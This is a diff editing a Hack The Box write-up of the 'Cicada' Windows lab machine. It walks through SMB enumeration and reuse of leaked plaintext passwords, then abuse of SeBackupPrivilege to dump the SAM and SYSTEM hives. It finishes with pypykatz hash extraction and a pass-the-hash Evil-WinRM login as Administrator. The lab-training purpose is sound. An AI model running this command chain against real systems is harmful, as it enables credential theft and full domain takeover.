@@ -5,6 +5,7 @@ description: ['#Windows #PrivilegeEscalation #SeBackupPrivilege #HashDump #RootS
 pubDate: 2024-09-29T19:46:00Z
 imgSrc: 'https://labs.hackthebox.com/storage/avatars/79616a32a057e5e672dadb51bb96dd04.png'
 imgAlt: 'Cicada HTB Challenge Image'
+tags: ['htb', 'windows', 'easy', 'privesc', 'active-directory']
 ---
 
 # Cicada WriteUp - Hack The Box
@@ -13,13 +14,13 @@ imgAlt: 'Cicada HTB Challenge Image'
 **IP Address:** 10.10.11.35  
 **Difficulty:** Easy
 
-In this write-up, we'll dive into the Cicada HTB box,This is an easy rated box which offers an engaging challenge focused on privilege escalation techniques. From the start, the goal is to explore how users with specific permissions can be exploited for elevated access. After some initial probing, I stumbled upon valid user credentials that led me to a development share filled with interesting files. One standout was a PowerShell script that unexpectedly revealed another user’s credentials.
+In this write-up, we'll dive into the Cicada HTB box. This is an easy-rated box which offers an engaging challenge focused on privilege escalation techniques. From the start, the goal is to explore how users with specific permissions can be exploited for elevated access. After some initial probing, I stumbled upon valid user credentials that led me to a development share filled with interesting files. One standout was a PowerShell script that unexpectedly revealed another user’s credentials.
 
 With the SeBackupPrivilege granted to my user, I was able to back up crucial system files, including the SYSTEM and SAM registries. This step opened the door to extracting hashed credentials for the Administrator account. Using those hashes, I successfully authenticated as the Administrator and took full control of the system. Let’s go through the steps I took to conquer this box and share some insights along the way.
 
 ## Reconnaissance
 
-Kicked things off with a rustscan and nmap scan, and found some interesting ports. The machine is a Windows server called **CICADA-DC**, and it's part of the **cicada.htb** domain, which I’ve added to my hosts file. No web services to poke at, so I’ll focus on **LDAP**, **SMB**, and **Kerberos** enumeration. The goal here is to gather some user and group info, maybe even dig into a few files.
+I kicked things off with a Rustscan and Nmap scan and found some interesting ports. The machine is a Windows server called **CICADA-DC**, and it's part of the **cicada.htb** domain, which I’ve added to my hosts file. No web services to poke at, so I’ll focus on **LDAP**, **SMB**, and **Kerberos** enumeration. The goal here is to gather some user and group info, maybe even dig into a few files.
 ```
 rustscan -a 10.10.11.35 -- -Pn -sC -sV -vvv
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
@@ -136,7 +137,7 @@ Host script results:
 
 ## SMB Enumeration
 
-I pivoted to SMB shares to see what i could access. Here's what showed up when I ran the `smbclient` command:
+I pivoted to SMB shares to see what I could access. Here's what showed up when I ran the `smbclient` command:
 
 ```bash
 ┌──(mofe㉿mofe)-[~]
@@ -155,7 +156,7 @@ Password for [WORKGROUP\mofe]:
 
 Reconnecting with SMB1 for workgroup listing.
 ```
-I tried accessing some shares and found soemthing interesting in the HR share. There was a Notice from HR.txt file sitting there.
+I tried accessing some shares and found something interesting in the HR share. There was a Notice from HR.txt file sitting there.
 ```bash
 ┌──(mofe㉿mofe)-[~/files/htb/cicada]
 └─$ smbclient -N //10.10.11.35/HR 
@@ -283,6 +284,7 @@ With credentials for `michael.wrightson`, I used `enum4linux-ng` to gather more 
 
 ```bash
 python3 enum4linux-ng.py -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
+```
 
 This provided a lot of information, but what caught my attention was the "Users via RPC" section. Specifically, the user david.orelious had a description that contained what appears to be their password:
 
@@ -348,7 +350,7 @@ Using the credentials for `david.orelious`, I accessed the `DEV` share, which wa
 ```bash
 smbclient "//10.10.11.35/DEV" -U david.orelious
 ```
-After successfully logging in, I ran the dir command and found a powershell file:
+After successfully logging in, I ran the `dir` command and found a PowerShell file:
 
 ```
 
@@ -357,7 +359,7 @@ smb: \> dir
   ..                                  D        0  Thu Mar 14 13:21:29 2024
   Backup_script.ps1                   A      601  Wed Aug 28 18:28:22 2024
 ```
-The PowerShell script named Backup_script.ps1, i downloaded the script:
+I downloaded the PowerShell script named `Backup_script.ps1`:
 
 ```powershell
 
@@ -374,9 +376,9 @@ Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
 
-This script authenticating as emily.oscars, along with a hardcoded password: Q!3@Lp#M6b*7t*Vt.
+This script authenticates as `emily.oscars` with a hardcoded password: `Q!3@Lp#M6b*7t*Vt`.
 
-using netexec we discovered that we can access Windows Remote Management (WinRM) service as emily.oscars
+Using `netexec`, we discovered we can access the Windows Remote Management (WinRM) service as `emily.oscars`:
 ```bash
 netexec  winrm cicada.htb -u emily.oscars  -p 'Q!3@Lp#M6b*7t*Vt' --continue-on-success
 WINRM       10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
@@ -457,16 +459,17 @@ SeIncreaseWorkingSetPrivilege
     Description: This privilege allows a user to increase the working set of a process. The working set is the amount of memory that a process can use without causing it to be swapped out of physical memory.
     Potential Use: While this privilege is less commonly exploited, it can be used to improve the performance of an application by increasing its memory allocation, potentially allowing it to run more efficiently or evade detection in certain scenarios.
 
-we'll be focusing on SeBackupPriviledge for escalation
+We'll be focusing on `SeBackupPrivilege` for escalation.
 
 ### SeBackupPrivilege for Escalation
 
-  Create a Temporary Directory
+1. **Create a Temporary Directory:**
 
 ```
 mkdir C:\temp
 ```
-Backup SYSTEM and SAM Files
+
+2. **Backup SYSTEM and SAM Files:**
 
  SYSTEM File: Contains information about the system configuration and control settings for the operating system. It includes details such as services, drivers, and device settings.
  SAM File: Stands for Security Account Manager; it stores user account information, including usernames and hashed passwords for local accounts.
@@ -477,14 +480,15 @@ reg save hklm\system C:\temp\system
 reg save hklm\sam C:\temp\sam
 ```
 
-Exfiltrate the Files to Your Own Machine
+3. **Exfiltrate the Files to Your Own Machine:**
 
 After successfully backing up the files to the temporary directory, you can use various methods to transfer these files to your local machine. Common methods include using Evil-WinRM with download commands or using SMB shares.
 
 ### Privilege Escalation Using Pass-the-Hash
 
- Extract Hashes with pypykatz
- Use pypykatz to parse the SAM and SYSTEM registry hives to extract stored credentials.
+#### Extract Hashes with pypykatz
+
+Use `pypykatz` to parse the SAM and SYSTEM registry hives to extract stored credentials:
  ```
 ┌──(mofe㉿mofe)-[~/files/htb/cicada]
 └─$ pypykatz registry --sam sam system
@@ -501,9 +505,9 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
-Identify the Administrator Hash
+#### Identify the Administrator Hash
 
-The hash for the Administrator account is 2b87e7c93a3e8a0ea4a581937016f341. You will use this hash to authenticate as the Administrator without needing the plaintext password.
+The hash for the Administrator account is `2b87e7c93a3e8a0ea4a581937016f341`. Use this hash to authenticate as Administrator without needing the plaintext password:
 
 ```powershell
 ┌──(mofe㉿mofe)-[~/files/htb/cicada]
@@ -521,7 +525,7 @@ cicada\administrator
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
 
 ```
-And now we have Administrator priviledges
+And now we have Administrator privileges.
 
 
 
